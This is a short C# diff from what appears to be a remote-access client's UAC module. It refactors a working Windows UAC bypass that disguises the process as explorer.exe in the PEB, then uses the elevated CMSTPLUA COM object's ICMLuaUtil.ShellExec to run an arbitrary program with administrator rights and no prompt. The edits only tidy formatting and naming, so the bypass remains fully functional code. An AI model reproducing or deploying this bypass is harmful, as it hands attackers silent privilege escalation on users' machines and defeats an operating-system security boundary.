@@ -15,7 +15,6 @@ namespace Client.Armitage.UAC
     /// </summary>
     public class ucmCMLuaUtilShellExecMethod
     {
-
         internal enum HRESULT : long
         {
             S_FALSE = 0x0001,
@@ -112,18 +111,19 @@ namespace Client.Armitage.UAC
                 [In] ulong fMask,
                 [In] ulong nShow);
         }
-
         public static bool BypassUAC(string targetfile, string args)
         {
-            if (!MasqueradePEB.Do(@"C:\windows\explorer.exe")) return false;
+            if (!_MasqueradePEB.MasqueradePEB(@"C:\Windows\explorer.exe")) return false;
 
             // CLSID
-            Guid classId_cmstplua = new Guid("{3E5FC7F9-9A51-4367-9063-A120244FBEC7}");
+            Guid classId_cmstplua = new Guid("3E5FC7F9-9A51-4367-9063-A120244FBEC7");
             // Interface ID
-            Guid interfaceId_icmluautil = new Guid("{6EDD6D74-C007-4E75-B76A-E5740995E24C}");
+            Guid interfaceId_icmluautil = new Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C");
 
             ICMLuaUtil icm = (ICMLuaUtil)LaunchElevatedCOMObject(classId_cmstplua, interfaceId_icmluautil);
-            var g = icm.ShellExec(targetfile, args, null, SEE_MASK_DEFAULT, SW_SHOW);
+
+            icm.ShellExec(targetfile, args, null, SEE_MASK_DEFAULT, SW_SHOW);
+
             Marshal.ReleaseComObject(icm);
 
             return true;
